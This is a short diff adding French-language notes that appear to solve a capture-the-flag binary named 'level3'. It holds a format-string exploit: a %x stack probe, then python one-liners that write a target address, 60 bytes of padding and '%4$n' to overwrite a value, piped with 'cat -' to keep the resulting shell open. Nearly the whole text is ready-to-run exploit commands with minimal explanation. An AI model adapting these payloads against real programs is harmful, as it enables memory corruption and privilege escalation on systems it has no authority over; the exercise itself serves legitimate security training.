@@ -1,0 +1,9 @@
+echo "BBBB %x %x %x %x %x %x" | ./level3
+
+c 64 bytes donc on ajoute 60 bytes
+
+python -c 'print "\x8c\x98\x04\x08"+"B"*60+"%4$n"' | ./level3
+
+on cat pour laisser le shell open
+
+(python -c 'print "\x8c\x98\x04\x08"+"B"*60+"%4$n"'; cat -) | ./level3
